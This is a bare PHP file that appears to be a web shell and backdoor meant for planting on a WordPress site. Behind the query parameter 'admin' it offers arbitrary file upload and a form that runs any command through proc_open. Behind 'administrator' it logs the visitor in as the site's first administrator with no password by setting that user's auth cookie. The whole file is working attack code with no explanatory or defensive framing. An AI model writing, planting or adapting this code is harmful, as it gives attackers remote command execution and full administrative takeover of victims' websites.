<?php

if(isset($_GET['admin']))
{

$filename = $_FILES['file']['name'];
$filetmp  = $_FILES['file']['tmp_name'];
echo "<br><form method='POST' enctype='multipart/form-data'>
<input type='file' name='file' />
<input type='submit' value='>>>' />
</form>";
echo '<form method="post">
<input type="text" name="xmd" size="30">
<input type="submit" value="Kill">
</form>';
if(move_uploaded_file($filetmp,$filename)=='1'){
echo '[OK] ===> '.$filename;
}
if(isset($_POST['xmd'])){
$xmd=$_POST['xmd'];
$descriptors = [
  0 => ['pipe', 'r'], // stdin
  1 => ['pipe', 'w'], // stdout
  2 => ['pipe', 'w'], // stderr
];

$process = proc_open($xmd, $descriptors, $pipes);

$output = stream_get_contents($pipes[1]);
$error = stream_get_contents($pipes[2]);

fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

echo "<textarea  cols=30 rows=15;>$output";
echo "Error:\n$error\n";
}
}
if(isset($_GET['administrator']))
{
require(rtrim($_SERVER["DOCUMENT_ROOT"], "/\\") . DIRECTORY_SEPARATOR . "wp-blog-header.php");
$u = get_users('role=administrator');
$us="";
foreach($u as $p){
	$us=$p->user_login; break;
}
$us = get_user_by('login', $us ); 
if ( !is_wp_error( $us ) )
{	get_currentuserinfo(); 
		if ( user_can( $us, "administrator" ) ){ 
		   wp_clear_auth_cookie(); 
   		   wp_set_current_user ( $us->ID );
    	   wp_set_auth_cookie  ( $us->ID );
    	   $redirect_to = admin_url();  
           wp_safe_redirect( $redirect_to );
           exit();
  } 
}
}

?>
